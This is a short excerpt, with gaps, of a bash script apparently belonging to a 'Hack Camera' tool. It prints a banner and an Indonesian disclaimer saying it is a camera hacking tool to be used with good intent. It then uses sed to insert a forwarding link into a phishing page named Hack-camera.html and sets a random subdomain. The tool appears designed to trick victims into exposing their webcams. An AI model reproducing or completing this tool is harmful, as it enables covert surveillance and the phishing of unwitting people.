...
printf "               v     v        \n"
printf "                ^___^         \n"
printf "\e[1;92m   𝑯𝒂𝒄𝒌 𝑪𝒂𝒎𝒆𝒓𝒂 𝒃𝒚 𝑴𝒓.𝑿      \e[0m\n"


printf " \e[1;77m Ini adalah tools hack camera gunakan dengan tujuan baik\e[0m \n"
...
sed 's+forwarding_link+'$link'+g' Hack-camera.html > index2.html
...
sed 's+forwarding_link+'$send_link'+g' Hack-camera.html > index2.html
...
default_subdomain="Hack-camera$RANDOM"
